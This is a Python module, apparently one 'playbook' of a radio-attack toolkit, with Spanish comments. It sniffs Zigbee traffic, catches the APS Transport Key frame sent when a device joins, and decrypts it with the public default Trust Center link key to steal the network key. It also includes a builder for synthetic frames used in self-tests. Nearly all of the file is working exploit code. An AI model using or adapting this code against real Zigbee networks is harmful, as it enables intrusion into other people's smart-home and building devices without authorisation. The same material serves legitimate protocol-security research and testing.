"""Playbook 1 — transport-key-watcher (automático).

Vigila el aire, detecta el frame APS Transport Key durante el (re)join de un
dispositivo y lo descifra con la Trust Center Link Key por defecto.

La debilidad documentada: el Transport Key viaja SIN seguridad a nivel NWK
(el dispositivo que se une aún no tiene la network key) y cifrado a nivel APS
con la TC link key — en el emparejamiento clásico, la pública "ZigBeeAlliance09".

Layout del frame objetivo:
  MAC hdr | NWK hdr (security=0) | APS FC(1)=0x02 | counter(1) |
  APS aux: SC(1) | FC(4 LE) | src=TC(8 LE) | <cifrado || MIC 4B>

Comando descifrado: 0x05 (Transport Key) | key type 0x01 (network) | KEY(16B) | …
"""

from __future__ import annotations

import struct
from dataclasses import dataclass
from typing import Callable

from skyrf.playbooks.crypto_zigbee import (
    DEFAULT_TC_LINK_KEY, build_nonce, ccm_decrypt, ccm_encrypt,
)
from skyrf.playbooks.frames import (
    SEC_CTRL_TC, mac_header, nwk_header, parse_mac, parse_nwk_security,
)

APS_CMD_TRANSPORT_KEY = 0x05
KEY_TYPE_NETWORK = 0x01


@dataclass
class CapturedNetwork:
    pan_id: int
    src_tc: int            # dirección larga del Trust Center
    network_key: bytes
    link_key_used: bytes

    def summary(self) -> str:
        return (f"PAN 0x{self.pan_id:04X} · TC 0x{self.src_tc:016X} · "
                f"network key {self.network_key.hex()}")


class TransportKeyError(Exception):
    pass


def try_decrypt_transport_key(frame: bytes,
                              link_key: bytes = DEFAULT_TC_LINK_KEY,
                              ) -> CapturedNetwork | None:
    """Intenta extraer la network key de un frame 802.15.4 crudo.

    Devuelve CapturedNetwork si el frame era un Transport Key y el MIC
    verificó con la link key; None en cualquier otro caso (incluye tráfico
    cifrado normal — no hay falsos positivos porque el MIC se verifica).
    """
    try:
        mac = parse_mac(frame)
        nwk = parse_nwk_security(frame, mac["nwk_off"])
    except (ValueError, struct.error, IndexError):
        return None
    if nwk["security"]:
        return None  # NWK cifrado: no es un transport key clásico

    off = nwk["payload_off"]
    try:
        aps_fc, aps_counter = struct.unpack_from("<BB", frame, off)
    except struct.error:
        return None
    if (aps_fc & 0x03) != 0x02:  # APS command frame
        return None
    off += 2

    # APS aux security header: SC(1) | FC(4) | src largo(8)
    try:
        sc = frame[off]
        aps_fc4, src_long = struct.unpack_from("<IQ", frame, off + 1)
    except (struct.error, IndexError):
        return None
    aux = frame[off:off + 13]
    encrypted = frame[off + 13:]
    if len(encrypted) < 2 + 16 + 4:
        return None

    nonce = build_nonce(src_long, aps_fc4, sc)
    plain = ccm_decrypt(link_key, nonce, encrypted, aux)
    if plain is None:
        return None
    if len(plain) < 18 or plain[0] != APS_CMD_TRANSPORT_KEY or plain[1] != KEY_TYPE_NETWORK:
        return None

    return CapturedNetwork(
        pan_id=mac["dst_pan"], src_tc=src_long,
        network_key=plain[2:18], link_key_used=link_key,
    )


class TransportKeyWatcher:
    """Watcher pasivo: feed() con frames crudos; dispara callback al robar una key."""

    def __init__(self, on_key_captured: Callable[[CapturedNetwork], None],
                 link_keys: list[bytes] | None = None):
        self.on_key_captured = on_key_captured
        self.link_keys = link_keys or [DEFAULT_TC_LINK_KEY]
        self.networks: list[CapturedNetwork] = []

    def feed(self, frame: bytes) -> None:
        for lk in self.link_keys:
            net = try_decrypt_transport_key(frame, lk)
            if net is not None:
                self.networks.append(net)
                self.on_key_captured(net)
                return


# ---------------------------------------------------------------------------
# Laboratorio: construir un Transport Key sintético idéntico al de un hub real
# (para selftest sin hardware — ver playbooks/selftest.py).
# ---------------------------------------------------------------------------

def build_synthetic_transport_key(network_key: bytes, tc_addr: int, pan_id: int,
                                  frame_counter: int = 1,
                                  link_key: bytes = DEFAULT_TC_LINK_KEY) -> bytes:
    plain = bytes([APS_CMD_TRANSPORT_KEY, KEY_TYPE_NETWORK]) + network_key + b"\x00\x01"
    aux = bytes([SEC_CTRL_TC]) + struct.pack("<I", frame_counter) + struct.pack("<Q", tc_addr)
    nonce = build_nonce(tc_addr, frame_counter, SEC_CTRL_TC)
    encrypted = ccm_encrypt(link_key, nonce, plain, aux)

    aps = bytes([0x02, 0x77])  # APS command FC + counter
    return mac_header(pan_id, 0xFFFF, 0x0000, seq=0x21) + nwk_header(
        0xFFFF, 0x0000, seq=0x34, security=False) + aps + aux + encrypted
